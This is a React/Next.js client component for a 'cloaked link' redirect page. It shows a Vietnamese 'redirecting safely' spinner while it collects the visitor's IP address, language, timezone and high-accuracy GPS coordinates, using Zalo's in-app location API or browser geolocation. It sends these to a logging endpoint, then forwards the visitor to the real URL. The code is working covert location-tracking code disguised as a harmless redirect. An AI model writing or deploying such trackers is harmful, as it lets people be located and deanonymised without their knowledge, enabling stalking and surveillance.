
'use client';
    
import { useEffect, useState } from 'react';
import { Loader2 } from 'lucide-react';
import type { CloakedLinkConfig } from '@/app/actions/cloaked-links';

interface RedirectClientProps {
  config: CloakedLinkConfig;
}

export function RedirectClient({ config }: RedirectClientProps) {
  const { id, redirectUrl } = config;
  const [statusText, setStatusText] = useState('Đang chuyển hướng an toàn...');

  useEffect(() => {
    const logLocationAndRedirect = async () => {
      let clientIp = 'N/A';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
      }

      const sendLog = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
        const body: any = { 
          id,
          ip: clientIp, 
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
        
        if (pos) {
          body.lat = pos.coords.latitude;
          body.lon = pos.coords.longitude;
          body.acc = pos.coords.accuracy;
        }

        fetch('/api/log-cloaked-link', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          keepalive: true,
        }).finally(() => {
          window.location.href = redirectUrl;
        });
      };

      const handleError = () => {
        // Log without location and redirect.
        sendLog();
      };

      if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
                sendLog({ coords: { latitude: data.latitude, longitude: data.longitude, accuracy: data.accuracy || 15 } });
            } else {
                handleError();
            }
        });
      } else if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          sendLog,
          handleError,
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        handleError();
      }
    };
    
    const timer = setTimeout(logLocationAndRedirect, 500);
    return () => clearTimeout(timer);
  }, [id, redirectUrl]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-background p-4">
      <div className="flex flex-col items-center gap-4 text-muted-foreground">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
        <p className="text-lg font-medium">{statusText}</p>
      </div>
    </div>
  );
}
